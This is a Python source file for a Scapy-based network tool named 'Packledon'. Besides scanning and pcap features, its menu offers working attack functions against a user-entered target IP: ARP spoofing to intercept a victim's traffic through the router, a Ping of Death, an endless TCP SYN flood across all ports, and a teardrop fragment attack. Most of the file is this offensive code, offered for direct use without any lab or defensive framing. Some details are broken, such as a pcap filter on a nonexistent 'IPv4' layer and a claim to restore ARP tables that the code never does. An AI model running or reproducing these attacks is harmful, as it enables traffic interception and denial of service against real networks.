#imports
from itertools import count
from pyfiglet import Figlet
#import scapy.all as scapy #need scapy for network control/access 
from scapy.all import *
import sys
import ipaddress


#function for arp and ping scanning aka option 1
def arp_and_ping_scanning():
    # Input range or subnet
    target_range = input("Enter the target IP address range or subnet for ARP and Ping scanning (e.g. 192.168.1.0/24): ")

    # Create the IP range from input using ipaddress
    try:
        network = ipaddress.IPv4Network(target_range, strict=False)
    except ValueError as e:
        print(f"Invalid network: {e}")
        return

    # ARP scan on the specified IP range (sending ARP requests)
    print("Starting ARP Scan...")
    arp_scan_result = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(network)), timeout=2, verbose=0)[0]

    # Ping Scan (ICMP) on the same IP range
    print("Starting Ping Scan...")
    ping_scan_result = []
    for ip in network.hosts():  # `hosts()` excludes network and broadcast addresses
        reply = sr1(IP(dst=str(ip))/ICMP(), timeout=2, verbose=0)
        if reply:
            ping_scan_result.append(ip)

    # Display ARP scan results
    if arp_scan_result:
        print("\nARP Scan Results:")
        for sender, target in arp_scan_result:
            print(f"Sender: {sender.psrc}, Target: {target.pdst}")
    else:
        print("No ARP scan results found.")

    # Display Ping scan results
    if ping_scan_result:
        print("\nPing Scan Results (Active Hosts):")
        for ip in ping_scan_result:
            print(f"Host found: {ip}")
    else:
        print("No active hosts found in the Ping scan.")





def enter_and_read_pcap():
  pcap_file_path = input("Enter the pcap file path: ")

  try:
      with PcapReader(pcap_file_path) as pcap:
          for packet in pcap:
              if IPv4 in packet:
                  print(packet[IPv4].src)
  except FileNotFoundError:
      print(f"Error: File '{pcap_file_path}' not found.")
  except PermissionError:
      print(f"Error: Permission denied for '{pcap_file_path}'.")
  except Exception as e:
      print(f"An error occurred: {e}")




def arp_spoofing_attack():
    victim_ip = input("Enter the victim's IP address: ")
    router_ip = input("Enter the router's IP address: ")

    enable_ip_forwarding = input("Do you want to enable IP forwarding? (yes/no): ").strip().lower()

    def get_mac(ip):
        """
        Sends an ARP request to get the MAC address of a given IP.
        """
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answ = srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        if answ:
            return answ[0][1].hwsrc
        else:
            print(f"[-] Failed to get MAC address for {ip}. Exiting.")
            sys.exit(1)

    def arp_spoofing(target_arp_ip, spoof_ip):
        """
        Creates and sends an ARP spoofing packet to poison the ARP table.
        """
        target_mac = get_mac(target_arp_ip)
        if not target_mac:
            return
        packet = ARP(op=2, pdst=target_arp_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    def enable_linux_ip_forwarding():
        """ Enables IP forwarding in Linux to allow traffic to pass through. """
        print("[+] Enabling IP forwarding...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    def disable_linux_ip_forwarding():
        """ Disables IP forwarding after the attack ends. """
        print("[+] Disabling IP forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    # Enable IP forwarding if user chose "yes"
    if enable_ip_forwarding == "yes":
        enable_linux_ip_forwarding()

    send_packets_count = 0
    try:
        while True:
            send_packets_count += 2
            arp_spoofing(victim_ip, router_ip)
            arp_spoofing(router_ip, victim_ip)
            print(f"[+] Packets Sent: {send_packets_count}", end="\r")
            sys.stdout.flush()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Stopping ARP spoofing attack. Restoring ARP tables...")
        if enable_ip_forwarding == "yes":
            disable_linux_ip_forwarding()




def ping_of_death(target_ip):
    print(f"[+] Starting Ping of Death attack on {target_ip}...")
    send( fragment(IP(dst=target_ip)/ICMP()/("X"*65500)), verbose=False)


def tcp_syn_flood(target_ip):
    try:
        print(f"[+] Starting TCP SYN Flood attack on {target_ip}...")
        while True:
            for port in range(1, 65535):
                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
    except KeyboardInterrupt:
        print("\n[+] Stopping Dos spoofing attack. Closing the application...")

def dos_attack():
    target_ip = input("Please enter the target IP address for the ping of death attack: ")    
    try:
        ping_of_death(target_ip)
        print(f"[+] Ping of Death attack on {target_ip} initiated.")

    except Exception as e:
        print(f"Ping of Death Failed: {e}")

    try:
        tcp_syn_flood(target_ip)
        print(f"[+] TCP SYN Flood attack on {target_ip} initiated. Use ctrl + C to stop the dos from running")

    except Exception as e:
        print(f"TCP SYN Flood Failed: {e}")



def packet_handler(packet):
    """Handles incoming packets and writes them to a file."""
    print(packet.summary())  # Print to console

    try:
        with open("generated.pcap", "a") as f:  # Open in append mode
            f.write(packet.summary() + "\n")  # Write packet details with newline
    except Exception as e:
        print(f"Error writing to file: {e}")


def teardrop_attack():
    target_ip = input("Please enter the target IP address for the teardrop attack: ")
    counter=0
    while counter<200:
        frag1 = IP(dst=target_ip, id=42, frag=0, flags="MF")/UDP()/("X"*2400)
        frag2 = IP(dst=target_ip, id=42, frag=1, flags="MF")/UDP()/("X"*2400)
        send(frag1)
        send(frag2)
        counter=counter+1



def main():
    #create banner
    f = Figlet(font='slant')
    print(f.renderText('Packledon'))
    print("What would you like to do?\n1. Scan for devices on the network\n2. Create a pcap?\n3. Examin a pcap?\n4. Perform an arp spoof attack?\n5. Perform a Dos attack?\n6. Perform a Teardrop attack?")
    user_determination= input("Please enter your selection from the above choices:" )
    
    print(user_determination)

    if user_determination == "1":
        arp_and_ping_scanning()

    elif user_determination == "2":
        sniff(prn=packet_handler, count=700)

    elif user_determination == "3":
        enter_and_read_pcap()

    elif user_determination == "4":
        arp_spoofing_attack()

    elif user_determination == "5":
        dos_attack()

    elif user_determination == "6":
        teardrop_attack()
    else:
        print("Please enter a valid selection")


if __name__ == "__main__":
    main()
